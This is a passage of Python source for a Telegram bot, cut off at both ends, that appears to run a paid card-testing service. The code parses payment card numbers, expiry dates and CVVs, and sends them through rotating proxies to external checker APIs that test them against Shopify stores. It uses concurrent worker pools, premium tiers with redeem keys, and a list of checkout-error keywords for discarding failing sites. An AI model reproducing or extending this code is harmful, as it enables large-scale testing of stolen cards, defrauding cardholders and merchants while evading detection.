    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
        
    # Restore the DEAD CARD title with the custom warning emoji ID 5447592907424955482
    result = result.replace("__DEAD_CARD_PLACEHOLDER__", '<tg-emoji emoji-id="5447592907424955482">⚠️</tg-emoji> 𝑫𝑬𝑨𝑫 𝑪𝑨𝑹𝑫 <tg-emoji emoji-id="5447592907424955482">⚠️</tg-emoji>')
    
    return result

# Bot Configuration (set API_ID, API_HASH, BOT_TOKEN in Render env / .env locally)
API_ID = int(os.environ.get('API_ID', '0'))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')

# Owner IDs — only these users can use /pr, /kick, /genkey, /ap
OWNERS = {5439878112, 6021047784}
OWNER_ID = 5439878112  # primary owner (legacy var, kept for compat)
def is_owner(uid):
    try:
        return int(uid) in OWNERS
    except Exception:
        return False


def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
    except Exception:
        pass
    return {}


def save_config(cfg):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(cfg or {}, f, indent=2)


def get_checker_apis_config():
    cfg = load_config()
    stored = cfg.get('checker_apis')
    if isinstance(stored, list) and stored:
        out = []
        defaults = {a['id']: a for a in DEFAULT_CHECKER_APIS}
        for entry in stored:
            if not isinstance(entry, dict) or not entry.get('id'):
                continue
            base = dict(defaults.get(entry['id'], {}))
            base.update(entry)
            base['max_workers'] = _normalize_api_workers(base.get('max_workers', 15))
            base['enabled'] = bool(base.get('enabled', True))
            out.append(base)
        for d in DEFAULT_CHECKER_APIS:
            if not any(x['id'] == d['id'] for x in out):
                out.append(dict(d))
        return out
    return [dict(a) for a in DEFAULT_CHECKER_APIS]


def save_checker_apis_config(apis_list):
    cfg = load_config()
    cfg['checker_apis'] = apis_list
    save_config(cfg)
    get_checker_manager().reload()


def set_checker_api_workers(api_id, max_workers):
    apis = get_checker_apis_config()
    for api in apis:
        if api['id'] == api_id:
            api['max_workers'] = _normalize_api_workers(max_workers)
            save_checker_apis_config(apis)
            return True
    return False


def set_all_checker_api_workers(max_workers):
    """Set the same worker count on every configured API."""
    v = _normalize_api_workers(max_workers)
    apis = get_checker_apis_config()
    if not apis:
        return False
    for api in apis:
        api['max_workers'] = v
    save_checker_apis_config(apis)
    return v


def set_checker_api_url(api_id, url):
    url = (url or '').strip()
    if not url:
        return False
    if '?' not in url:
        url = url.rstrip('/') + '/shopify?'
    apis = get_checker_apis_config()
    for api in apis:
        if api['id'] == api_id:
            api['url'] = url
            save_checker_apis_config(apis)
            return True
    return False


def set_checker_api_enabled(api_id, enabled):
    apis = get_checker_apis_config()
    for api in apis:
        if api['id'] == api_id:
            api['enabled'] = bool(enabled)
            save_checker_apis_config(apis)
            return True
    return False


class _ApiWorkerPool:
    def __init__(self, max_workers):
        self.semaphore = asyncio.Semaphore(max_workers)

    async def execute(self, coro_factory):
        async with self.semaphore:
            return await coro_factory()


class CheckerApiManager:
    """Round-robin across enabled checker APIs; each API has its own concurrency cap.
    APIs with role='primary' are used for normal checking (round-robin).
    APIs with role='fallback' are reserved for retrying error cards only."""

    def __init__(self):
        self._pools = {}
        self._apis = []
        self._primary = []
        self._fallback = []
        self._rr = 0
        self._rr_fb = 0
        self.reload()

    def reload(self):
        self._apis = [a for a in get_checker_apis_config() if a.get('enabled') and a.get('url')]
        self._primary = [a for a in self._apis if a.get('role', 'primary') == 'primary']
        self._fallback = [a for a in self._apis if a.get('role') == 'fallback']
        self._pools = {
            a['id']: _ApiWorkerPool(_normalize_api_workers(a.get('max_workers', 15)))
            for a in self._apis
        }

    def total_workers(self):
        if not self._apis:
            return 0
        return sum(int(a.get('max_workers', 15)) for a in self._apis)

    def get_api_ids(self):
        return [a['id'] for a in self._apis]

    def has_fallback(self):
        return len(self._fallback) > 0

    def workers_summary_text(self):
        if not self._apis:
            return '<b>0</b> API workers (none enabled)'
        parts = []
        for a in self._apis:
            role_tag = '🔄' if a.get('role') == 'fallback' else '⚡'
            parts.append(f"{role_tag}<code>{a['id']}</code>: {int(a.get('max_workers', 15))}")
        total = self.total_workers()
        return f"<b>{total}</b> API workers ({', '.join(parts)})"

    def pick_api_id(self, exclude=None):
        """Round-robin across PRIMARY APIs only; exclude= last api_id to force switch on retry."""
        pool = self._primary
        if not pool:
            pool = self._apis  # fallback to all if no primary
        if not pool:
            return None
        if exclude and len(pool) > 1:
            alt = [a for a in pool if a['id'] != exclude]
            if alt:
                pool = alt
        api = pool[self._rr % len(pool)]
        self._rr += 1
        return api['id']

    def pick_fallback_api_id(self):
        """Pick a fallback API for error-card retry. Returns None if no fallback configured."""
        if not self._fallback:
            return None
        api = self._fallback[self._rr_fb % len(self._fallback)]
        self._rr_fb += 1
        return api['id']

    def get_api_url(self, api_id):
        for a in self._apis:
            if a['id'] == api_id:
                return a['url']
        apis = get_checker_apis_config()
        return apis[0]['url'] if apis else DEFAULT_CHECKER_APIS[0]['url']

    async def execute(self, api_id, coro_factory):
        if not self._apis:
            return await coro_factory()
        pool = self._pools.get(api_id)
        if not pool:
            api_id = self.pick_api_id()
            pool = self._pools.get(api_id)
        if not pool:
            return await coro_factory()
        return await pool.execute(coro_factory)


_checker_manager = None


def get_checker_manager():
    global _checker_manager
    if _checker_manager is None:
        _checker_manager = CheckerApiManager()
    return _checker_manager


_checker_sessions: dict[str, aiohttp.ClientSession] = {}


def _checker_session_for(api_url: str) -> aiohttp.ClientSession:
    key = (api_url or '').split('?')[0].rstrip('/')
    sess = _checker_sessions.get(key)
    if sess is None or sess.closed:
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(limit=500)
        _checker_sessions[key] = aiohttp.ClientSession(timeout=timeout, connector=connector)
    return _checker_sessions[key]


async def _checker_request(api_url, site, card, proxy, *, _infra_attempt=0):
    params = {'site': site, 'cc': card, 'proxy': proxy}
    session = _checker_session_for(api_url)
    try:
        async with session.get(api_url, params=params) as resp:
            body = await resp.text()
            if not body or not body.strip():
                return {
                    'Response': 'Empty API response',
                    'Gateway': 'Unknown', 'Price': '-', 'Status': False,
                }
            try:
                data = json.loads(body)
            except json.JSONDecodeError:
                snippet = body.strip()[:300]
                return {
                    'Response': f'Invalid JSON: {snippet}',
                    'Gateway': 'Unknown', 'Price': '-', 'Status': False,
                }
            if isinstance(data, dict):
                return data
            return {
                'Response': f'Invalid JSON structure ({type(data).__name__})',
                'Gateway': 'Unknown', 'Price': '-', 'Status': False,
            }
    except asyncio.TimeoutError:
        if _infra_attempt < 1:
            await asyncio.sleep(0.15)
            return await _checker_request(
                api_url, site, card, proxy, _infra_attempt=_infra_attempt + 1,
            )
        return {'Response': 'Request timeout', 'Gateway': 'Unknown', 'Price': '-', 'Status': False}
    except Exception as e:
        return {'Response': str(e), 'Gateway': 'Unknown', 'Price': '-', 'Status': False}


# File paths — runtime data on DATA_DIR (persistent disk on Render); code assets stay in _BOT_DIR
_BOT_DIR = _BOT_DIR_EARLY
PREMIUM_FILE = os.path.join(_DATA_DIR, 'premium.txt')
PREMIUM_JSON = os.path.join(_DATA_DIR, 'premium.json')
KEYS_FILE    = os.path.join(_DATA_DIR, 'keys.json')
MIRROR_FILE  = os.path.join(_DATA_DIR, 'mirror_group.txt')
_legacy_mirror = os.path.join(os.getcwd(), 'mirror_group.txt')
if not os.path.isfile(MIRROR_FILE) and os.path.isfile(_legacy_mirror):
    try:
        with open(_legacy_mirror, 'r', encoding='utf-8') as src, open(MIRROR_FILE, 'w', encoding='utf-8') as dst:
            dst.write(src.read().strip())
    except Exception:
        pass
USERS_FILE   = os.path.join(_DATA_DIR, 'users.json')
BANS_FILE    = os.path.join(_DATA_DIR, 'banned.json')
SITES_FILE = os.path.join(_DATA_DIR, 'sites.txt')
PROXY_FILE = os.path.join(_DATA_DIR, 'proxy.txt')
GLOBAL_PROXY_FILE = os.path.join(_DATA_DIR, 'global_proxies.txt')
_legacy_proxy_bot = os.path.join(_BOT_DIR, 'proxy.txt')
_legacy_proxy_cwd = os.path.join(os.getcwd(), 'proxy.txt')
if not os.path.isfile(GLOBAL_PROXY_FILE):
    for _legacy in (_legacy_proxy_bot, _legacy_proxy_cwd):
        if os.path.isfile(_legacy):
            try:
                with open(_legacy, 'r', encoding='utf-8', errors='ignore') as src, \
                        open(GLOBAL_PROXY_FILE, 'w', encoding='utf-8') as dst:
                    dst.write(src.read())
                break
            except Exception:
                pass
USER_PROXY_DIR = os.path.join(_DATA_DIR, 'user_proxies')
os.makedirs(USER_PROXY_DIR, exist_ok=True)

def user_proxy_file(user_id):
    return os.path.join(USER_PROXY_DIR, f'proxy_{user_id}.txt')

# Initialize bot (session file lives on DATA_DIR so it survives Render redeploys)
_bot_id = BOT_TOKEN.split(':')[0] if ':' in BOT_TOKEN else 'bot'
_SESSION_PATH = os.path.join(_DATA_DIR, f'evelyn_soul_{_bot_id}')
bot = TelegramClient(_SESSION_PATH, API_ID, API_HASH).start(bot_token=BOT_TOKEN)
migrate_plain_sites_txt(SITES_FILE)


_CACHE_TTL = 30.0
_banned_cache: tuple[float, set] = (0.0, set())


def load_banned_users() -> set:
    global _banned_cache
    ts, cached = _banned_cache
    if time.time() - ts < _CACHE_TTL:
        return cached
    data = _load_json(BANS_FILE, [])
    if not isinstance(data, list):
        banned = set()
    else:
        banned = set()
        for x in data:
            try:
                banned.add(int(x))
            except (TypeError, ValueError):
                pass
    _banned_cache = (time.time(), banned)
    return banned


async def save_banned_users(banned: set):
    global _banned_cache
    await _save_json(BANS_FILE, sorted(int(x) for x in banned))
    _banned_cache = (time.time(), set(banned))


def is_banned(uid) -> bool:
    try:
        return int(uid) in load_banned_users()
    except (TypeError, ValueError):
        return False


# Ban gate — runs before other handlers (private chats only).
@bot.on(events.NewMessage(incoming=True))
async def _ban_gate(event):
    try:
        if not event.is_private:
            return
        uid = event.sender_id
        if is_owner(uid) or not is_banned(uid):
            return
        await event.reply(
            premium_emoji('🚫 <b>You are banned</b> from using this bot.'),
            parse_mode='html',
        )
        raise events.StopPropagation
    except events.StopPropagation:
        raise
    except Exception:
        return


# ─── Force-Join Channel Gate ───────────────────────────────────────────────
# Users MUST be members of this channel to use the bot. Bot must be admin
# in the channel so it can call GetParticipant.
FORCE_JOIN_CHAT_ID = -1004386597112         # hardcoded channel id
FORCE_JOIN_INVITE = "https://t.me/+QZSXoXFo9qVhM2M6"

async def is_user_in_force_channel(user_id):
    """Live membership check. Bot must be admin in FORCE_JOIN_CHAT_ID."""
    from telethon.tl.functions.channels import GetParticipantRequest
    from telethon.errors import (
        UserNotParticipantError,
        ChatAdminRequiredError,
        ChannelPrivateError,
    )
    try:
        channel = await bot.get_input_entity(FORCE_JOIN_CHAT_ID)
        await bot(GetParticipantRequest(channel, user_id))
        return True
    except UserNotParticipantError:
        return False
    except (ChatAdminRequiredError, ChannelPrivateError) as e:
        print(f"[force-join] channel access error (is bot admin?): {e}")
        return False
    except Exception as e:
        print(f"[force-join] GetParticipant error uid={user_id}: {e}")
        return False

_FORCE_JOIN_EXEMPT_CMDS = frozenset({'/bin'})


def _force_join_buttons():
    return [
        [Button.url("📢 Join Channel", FORCE_JOIN_INVITE)],
        [Button.inline("✅ I've Joined", b"fj_check")],
    ]


async def _prompt_force_join(event):
    await event.reply(
        premium_emoji(
            "🔒 <b>Access locked</b>\n\n"
            "You must join our official channel to use this bot.\n"
            "Tap <b>Join Channel</b>, then tap <b>✅ I've Joined</b> to verify."
        ),
        parse_mode='html',
        buttons=_force_join_buttons(),
    )


async def _user_needs_force_join(user_id):
    if is_owner(user_id):
        return False
    return not await is_user_in_force_channel(user_id)


# Global gatekeeper — all private messages except /bin.
@bot.on(events.NewMessage(incoming=True))
async def _force_join_gate(event):
    try:
        if not event.is_private:
            return
        uid = event.sender_id
        if is_owner(uid):
            return
        text = (event.message.text or '').strip()
        cmd = (text.split() or [''])[0].lower().split('@')[0]
        if cmd in _FORCE_JOIN_EXEMPT_CMDS:
            return
        if not await _user_needs_force_join(uid):
            return
        await _prompt_force_join(event)
        raise events.StopPropagation
    except events.StopPropagation:
        raise
    except Exception:
        return


@bot.on(events.CallbackQuery())
async def _force_join_cb_gate(event):
    try:
        if not event.is_private:
            return
        if event.data == b'fj_check':
            return
        uid = event.sender_id
        if is_owner(uid):
            return
        if not await _user_needs_force_join(uid):
            return
        await event.answer("🔒 Join the channel first, then tap ✅ I've Joined.", alert=True)
        raise events.StopPropagation
    except events.StopPropagation:
        raise
    except Exception:
        return

@bot.on(events.CallbackQuery(pattern=b"fj_check"))
async def _force_join_verify_cb(event):
    uid = event.sender_id
    if await is_user_in_force_channel(uid):
        try:
            await event.edit(
                premium_emoji("✅ <b>Verified!</b>\nYou can now use the bot. Send /start to begin."),
                parse_mode='html',
                buttons=None
            )
        except Exception:
            pass
        await event.answer("✅ Verified!")
    else:
        await event.answer("❌ You haven't joined the channel yet.", alert=True)

# Store active checking sessions
active_sessions = {}
chk_session_by_user: dict = {}   # user_id -> session_key (reliable stop/pause lookup)
# Track which users currently have a /chk running (one per user)
active_chk_users = set()


def _resolve_chk_session(user_id, message_id=None):
    """Match callback to /chk session — by button message id, else user's active session."""
    if message_id is not None:
        sk = f"{user_id}_{message_id}"
        if sk in active_sessions:
            return sk
    sk = chk_session_by_user.get(user_id)
    if sk and sk in active_sessions:
        return sk
    return None


def _stop_chk_session(user_id, message_id=None):
    """Halt /chk for user: drop session, purge queued pool jobs, release user lock."""
    session_key = _resolve_chk_session(user_id, message_id)
    if not session_key:
        return False
    active_sessions.pop(session_key, None)
    chk_session_by_user.pop(user_id, None)
    active_chk_users.discard(user_id)
    return True
# Track users with an active /st check (one card at a time per user)
active_st_users = set()

# ===== Dedicated per-user workers (concurrency) =====
DEFAULT_TIER_WORKERS = {
    'free': 15,
    'basic': 35,
    'pro': 50,
    'max': 100,
    'ultra': 300,
    'owner': 400,
}

def get_tier_workers_config():
    cfg = load_config()
    stored = cfg.get('tier_workers')
    if isinstance(stored, dict):
        merged = dict(DEFAULT_TIER_WORKERS)
        for k, v in stored.items():
            if k in merged:
                try:
                    merged[k] = int(v)
                except (ValueError, TypeError):
                    pass
        return merged
    return dict(DEFAULT_TIER_WORKERS)

def save_tier_workers_config(limits):
    cfg = load_config()
    cfg['tier_workers'] = limits
    save_config(cfg)

def get_user_speed_limit(user_id):
    limits = get_tier_workers_config()
    if is_owner(user_id):
        return limits.get('owner', 400)
    prem = get_user_premium(user_id)
    if not prem:
        return limits.get('free', 15)
    tier = str(prem.get('tier', DEFAULT_PREMIUM_TIER)).lower()
    return limits.get(tier, limits.get('max', 100))
# ===== End dedicated per-user workers =====

# Rate limiting: track last message time per user
# ─── Telegram official rate limits (core.telegram.org/bots/faq) ────────────
#   • 30 messages/sec  -> global across all chats
#   • 1  message /sec  -> same private chat   (sendMessage / editMessage)
#   • 20 messages/min  -> same group or channel  (≈ 1 every 3 seconds)
# We pick the strictest safe values so the bot works in DMs, groups & channels.
# ───────────────────────────────────────────────────────────────────────────
_last_msg_time = {}
_MSG_DELAY = 1.0      # min seconds between sends to the same chat (private 1/s)

_last_edit_time = {}
_progress_edit_locks: dict = {}
EDIT_INTERVAL = 8.0   # min seconds between edits to the same message
                      # Telegram allows ~1 edit/sec (DM) and 20/min (group≈3s);
                      # 8s buffer avoids FloodWait during mass /chk progress updates.

def _prune_rate_caches():
    if len(_last_edit_time) > 10_000:
        cutoff = time.time() - EDIT_INTERVAL * 3
        for k in [k for k, v in _last_edit_time.items() if v < cutoff]:
            _last_edit_time.pop(k, None)
    if len(_last_msg_time) > 10_000:
        cutoff = time.time() - _MSG_DELAY * 10
        for k in [k for k, v in _last_msg_time.items() if v < cutoff]:
            _last_msg_time.pop(k, None)


async def throttled_edit(message, text, force=False, user_id=None, **kwargs):
    """Edit a Telegram message, throttled to EDIT_INTERVAL seconds per message.
    Pass force=True to bypass the throttle (e.g. final summary edit)."""
    if message is None:
        return None
    key = getattr(message, 'id', id(message))
    now = time.time()
    last = _last_edit_time.get(key, 0)
    if not force and (now - last) < EDIT_INTERVAL:
        return None
    _last_edit_time[key] = now
    _prune_rate_caches()
    return await safe_send(lambda: message.edit(text, **kwargs), user_id=user_id)


async def safe_edit(message, text, *, force=False, user_id=None, **kwargs):
    """Edit with throttle + FloodWait handling — never raises to caller."""
    if message is None:
        return None
    try:
        return await throttled_edit(message, text, force=force, user_id=user_id, **kwargs)
    except FloodWaitError as e:
        print(f"[FloodWait] safe_edit: wait {e.seconds}s — skipped")
        return None
    except Exception as e:
        print(f"[safe_edit] {e}")
        return None

async def safe_send(factory, retries=3, user_id=None):
    """Wrapper for Telegram send/edit — pass a factory: lambda: bot.send_message(...)"""
    if user_id is not None:
        now = time.time()
        last = _last_msg_time.get(user_id, 0)
        gap = now - last
        if gap < _MSG_DELAY:
            await asyncio.sleep(_MSG_DELAY - gap)
        _last_msg_time[user_id] = time.time()

    for attempt in range(retries):
        try:
            return await factory()
        except FloodWaitError as e:
            wait = e.seconds
            print(f"[FloodWait] Telegram rate limit hit. Waiting {wait}s...")
            if wait > 20:
                print(f"[FloodWait] Wait too long ({wait}s), skipping message.")
                return None
            await asyncio.sleep(wait + 1)
        except Exception as e:
            print(f"[safe_send] error: {e}")
            return None
    return None

# Dead site error keywords
_DEAD_INDICATORS = (
    # Site/status errors
    'site error! status:', 'site error', 'site errors', 'site dead', 'site not supported', 'not supported',
    'all sites dead', 'all sites unavailable', 'invalid response from site', 'invalid response', 'no valid response',
    # Submit/rejected
    'submit rejected', 'submit_rejected',
    # Unknown results
    'unknown result', 'unknown', 'no result',
    # Session/token errors
    'no_session_token', 'no session token', 'failed to get session token',
    'unable to get', 'unable to get payment token',
    # JSON/response errors
    'expecting value: line 1 column 1', 'expecting value:', 'invalid json', 'invalid json response',
    'invalid json in submit response', '<!doctype', '<html', '<b>', '</b>',
    # curl errors
    'failed to perform', 'curl: (7)', 'curl: (92)', 'curl: (6)', 'curl: (28)',
    # DNS/network errors
    'getaddrinfo() thread failed', 'getaddrinfo failed',
    'failed to connect', 'connection refused',
    # Checkout/product errors
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'failed to detect product', 'failed to create checkout', 'no valid products',
    'failed to tokenize card', 'all tokenization endpoints failed', 'failed to get proposal data',
    'no checkout token found', 'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail',
    'error processing card', 'error processing',
    # URL/request errors
    'invalid url', 'error in 1st req', 'error in 1 req',
    'url rejected', 'malformed input',
    # Connection/SSL errors
    'cloudflare', 'connection failed', 'timed out',
    'server closed the connection', 'bytes read', 'clientpayloaderror',
    'response payload is not completed', 'transfer encoding', 'connection closed',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    # HTTP status codes
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'handle error', 'http 404',
    'http 429', 'http_429', 'httperror429', 'too many requests',
    'status: 429', 'status 429', 'status: 422', 'status 422', 'http 422',
    # Delivery/address errors
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    # Amount errors
    'amount_too_small', 'amount too small',
    'payments_positive_amount_expected', 'positive_amount_expected', 'positive amount expected',
    'price: $0.00', '$0.00',
    # Captcha
    'captcha_required', 'captcha required',
    # Cart errors
    'cart add failed after retries', 'cart failed', 'cart add failed',
    # NoneType errors
    "nonetype' object has no attribute 'get", 'nonetype object has no attribute',
    # Generic/misc
    'generic_error', 'generic error',
    'max retries exceeded',
    'all products sold out',
    # Shopify checkout errors
    'artifact_dissatisfaction', 'merchandise_expected', 'price_mismatch',
    # Login required
    'site requires login', 'requires login', 'login required',
    # Validation errors
    'validation_custom', 'validation custom', 'custom validation',
    # Currency mismatch
    'buyer_identity_presentment_currency_does_not_match',
    'presentment_currency_does_not_match', 'currency_does_not_match',
    # Payment terms mismatch
    'payments_payment_flexibility_terms_id_mismatch',
    'payment_flexibility_terms_id_mismatch', 'terms_id_mismatch',
)
# --- UPDATED LOADING FUNCTIONS ---
def get_file_lines(filepath):
    """Helper to read lines from a file fresh every time"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return site_urls_from_entries(load_global_sites())

def load_proxies():
    return load_global_proxies()


def load_global_proxies():
    """Owner-managed global proxy pool (hidden .gpx)."""
    return [p for p in get_file_lines(GLOBAL_PROXY_FILE) if _is_valid_proxy_format(p)]


def is_global_proxy_fallback_enabled():
    return bool(load_config().get('global_proxy_fallback_enabled', False))


def set_global_proxy_fallback_enabled(enabled: bool):
    cfg = load_config()
    cfg['global_proxy_fallback_enabled'] = bool(enabled)
    save_config(cfg)


def get_check_proxies(user_id):
    """Card-check proxies: user's own first; silent global pool if user has none and fallback on."""
    user_px = [p for p in load_user_proxies(user_id) if _is_valid_proxy_format(p)]
    if user_px:
        return user_px
    if is_global_proxy_fallback_enabled():
        global_px = load_global_proxies()
        if global_px:
            print(f"[proxy] global fallback for user {user_id} ({len(global_px)} proxies)")
            return global_px
    return []


def load_user_proxies(user_id):
    """Load proxies belonging to a specific user."""
    return get_file_lines(user_proxy_file(user_id))

async def purge_invalid_user_proxies(user_id):
    """Remove any malformed entries (e.g. 'first') from the user's proxy file.
    Returns the number of entries removed."""
    current = load_user_proxies(user_id)
    if not current:
        return 0
    valid = [p for p in current if _is_valid_proxy_format(p)]
    removed = len(current) - len(valid)
    if removed:
        async with aiofiles.open(user_proxy_file(user_id), 'w', encoding='utf-8') as f:
            for p in valid:
                await f.write(f"{p}\n")
    return removed

async def save_user_proxies(user_id, proxies):
    """Overwrite user's proxy file with given list."""
    async with aiofiles.open(user_proxy_file(user_id), 'w', encoding='utf-8') as f:
        for px in proxies:
            await f.write(f"{px}\n")


def _normalize_premium_entry(raw):
    if isinstance(raw, dict):
        tier = str(raw.get('tier') or DEFAULT_PREMIUM_TIER).lower()
        if tier not in PREMIUM_TIERS:
            tier = DEFAULT_PREMIUM_TIER
        limit = raw.get('limit')
        if limit is None:
            limit = PREMIUM_TIERS[tier]['limit']
        return {'exp': raw.get('exp', 0), 'tier': tier, 'limit': int(limit)}
    if isinstance(raw, (int, float)):
        tier = DEFAULT_PREMIUM_TIER
        return {'exp': raw, 'tier': tier, 'limit': PREMIUM_TIERS[tier]['limit']}
    return None


def _premium_entry_active(entry):
    if not entry:
        return False
    exp = entry.get('exp', 0)
    if exp == 0:
        return True
    try:
        return time.time() < float(exp)
    except (TypeError, ValueError):
        return False


def get_user_premium(user_id):
    """Active premium record, or None for free users."""
    uid = str(user_id)
    if uid in load_premium_users():
        tier = DEFAULT_PREMIUM_TIER
        return {'exp': 0, 'tier': tier, 'limit': PREMIUM_TIERS[tier]['limit']}
    data = _load_json(PREMIUM_JSON, {})
    entry = _normalize_premium_entry(data.get(uid))
    if not _premium_entry_active(entry):
        return None
    return entry


def is_premium(user_id):
    return get_user_premium(user_id) is not None


def get_user_card_limit(user_id):
    if is_owner(user_id):
        return PREMIUM_TIERS['ultra']['limit']
    prem = get_user_premium(user_id)
    if prem:
        return int(prem.get('limit') or PREMIUM_TIERS[DEFAULT_PREMIUM_TIER]['limit'])
    return FREE_CARD_LIMIT


def get_user_tier_display(user_id):
    if is_owner(user_id):
        return 'Owner', get_user_card_limit(user_id)
    prem = get_user_premium(user_id)
    if prem:
        tier = prem.get('tier', DEFAULT_PREMIUM_TIER)
        label = PREMIUM_TIERS.get(tier, {}).get('label', str(tier).title())
        return label, int(prem.get('limit') or PREMIUM_TIERS.get(tier, {}).get('limit', FREE_CARD_LIMIT))
    return 'Free', FREE_CARD_LIMIT


def _resolve_tier_name(raw):
    tier = str(raw or DEFAULT_PREMIUM_TIER).lower().strip()
    return tier if tier in PREMIUM_TIERS else None


def _tier_from_key_prefix(key):
    prefix = str(key or '').split('-', 1)[0].upper()
    for tier, meta in PREMIUM_TIERS.items():
        if meta['prefix'] == prefix:
            return tier
    return None

# ─── JSON store helpers ───────────────────────────────────────────────
def _load_json(path, default):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default if default is not None else {}

async def _save_json(path, data):
    async with aiofiles.open(path, 'w', encoding='utf-8') as f:
        await f.write(json.dumps(data, indent=2))

def premium_expiry_str(uid):
    entry = get_user_premium(uid)
    if not entry:
        return None
    exp = entry.get('exp', 0)
    if exp == 0:
        return "Lifetime"
    return datetime.fromtimestamp(float(exp)).strftime("%d/%m/%Y %H:%M")

def _gen_key(prefix="EVX"):
    body = ''.join(_secrets.choice(_string.ascii_uppercase + _string.digits) for _ in range(16))
    return f"{prefix}-{body[:4]}-{body[4:8]}-{body[8:12]}-{body[12:16]}"


_REDEEM_KEY_RE = re.compile(
    r'[A-Z]{2,6}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',
    re.IGNORECASE,
)
_REDEEM_DASHES = (
    '\u2010', '\u2011', '\u2012', '\u2013', '\u2014', '\u2015',
    '\u2212', '\uFE58', '\uFE63', '\uFF0D',
)
_REDEEM_JUNK = (
    '\u200b', '\u200c', '\u200d', '\u2060', '\ufeff', '\xa0',
    '\u202a', '\u202b', '\u202c', '\u202d', '\u202e',
)


def _clean_redeem_text(raw: str) -> str:
    text = str(raw or '')
    for ch in _REDEEM_JUNK:
        text = text.replace(ch, '')
    for d in _REDEEM_DASHES:
        text = text.replace(d, '-')
    return text.strip().strip('`\'"<>[](){} \t\n\r')


def _extract_redeem_keys_from_text(raw: str) -> list:
    """Pull every key from a blob (e.g. genkey message with 10 keys)."""
    text = _clean_redeem_text(raw)
    text = re.sub(r'^/redeem(?:@\w+)?\s*', '', text, flags=re.IGNORECASE)
    found = _REDEEM_KEY_RE.findall(text)
    out = []
    seen = set()
    for k in found:
        ku = k.upper()
        if ku not in seen:
            seen.add(ku)
            out.append(ku)
    if not out:
        compact = re.sub(r'[^A-Za-z0-9\-]', '', text).upper()
        m = _REDEEM_KEY_RE.search(compact)
        if m:
            out.append(m.group(0).upper())
    return out


def _normalize_redeem_key(raw: str) -> str:
    """Single key — first match only (for explicit /redeem KEY paste)."""
    keys = _extract_redeem_keys_from_text(raw)
    return keys[0] if keys else ''


def _lookup_redeem_key(keys: dict, normalized: str):
    if not normalized:
        return None, None
    if normalized in keys:
        return normalized, keys[normalized]
    norm_upper = normalized.upper()
    for k, v in keys.items():
        if str(k).upper() == norm_upper:
            return k, v
        if _normalize_redeem_key(k) == norm_upper:
            return k, v
    return None, None


async def _extract_redeem_keys_from_event(event) -> list:
    """Keys from /redeem args or replied message (supports multi-key genkey posts)."""
    text = (event.message.text or '').strip()
    text = re.sub(r'^/redeem(?:@\w+)?\s*', '', text, flags=re.IGNORECASE).strip()
    keys = _extract_redeem_keys_from_text(text)
    if keys:
        return keys
    if event.is_reply:
        try:
            replied = await event.get_reply_message()
            if replied and replied.message:
                return _extract_redeem_keys_from_text(replied.message)
        except Exception:
            pass
    return []


_mirror_cache: tuple[float, int | None] = (0.0, None)


def get_mirror_group():
    global _mirror_cache
    ts, cached = _mirror_cache
    if time.time() - ts < _CACHE_TTL:
        return cached
    try:
        with open(MIRROR_FILE, 'r', encoding='utf-8') as f:
            v = f.read().strip()
        result = int(v) if v else None
    except Exception:
        result = None
    _mirror_cache = (time.time(), result)
    return result


def _invalidate_mirror_cache():
    global _mirror_cache
    _mirror_cache = (0.0, None)

_CC_EXTRACT_RE = re.compile(r"(\d{12,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})")


def _luhn_valid(cc: str) -> bool:
    total = 0
    rev = cc[::-1]
    for i, ch in enumerate(rev):
        try:
            d = int(ch)
        except ValueError:
            return False
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def _normalize_cc_parts(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    """Validate + normalize to card|mm|yyyy|cvv (any separator input)."""
    cc = (cc or "").strip()
    mm = (mm or "").strip()
    yy = (yy or "").strip()
    cvv = (cvv or "").strip()

    if not cc or len(cc) < 12 or len(cc) > 16:
        return None
    try:
        mm_i = int(mm)
    except ValueError:
        return None
    if mm_i < 1 or mm_i > 12:
        return None
    if not _luhn_valid(cc):
        return None
    try:
        yy_i = int(yy)
    except ValueError:
        return None
    if yy_i < 100:
        yy_i += 2000
    if len(cvv) < 3 or len(cvv) > 4:
        return None
    return f"{cc}|{str(mm_i).zfill(2)}|{yy_i}|{cvv}"


def _parse_cc_from_raw(raw: str) -> str | None:
    """Single blob: regex first, then digit-chunk fallback."""
    cc = mm = yy = cvv = ""
    try:
        m = _CC_EXTRACT_RE.search(str(raw))
        if m:
            cc, mm, yy, cvv = m.group(1), m.group(2), m.group(3), m.group(4)
    except Exception:
        pass

    if not cc:
        digits: list[str] = []
        part = ""
        for c in str(raw):
            if "0" <= c <= "9":
                part += c
            else:
                if part:
                    digits.append(part)
                    part = ""
        if part:
            digits.append(part)
        if len(digits) >= 4:
            cc, mm, yy, cvv = digits[0], digits[1], digits[2], digits[3]

    return _normalize_cc_parts(cc, mm, yy, cvv)


def extract_cc(text):
    """Extract all valid CCs from any common format (|, /, space, mixed)."""
    if not text:
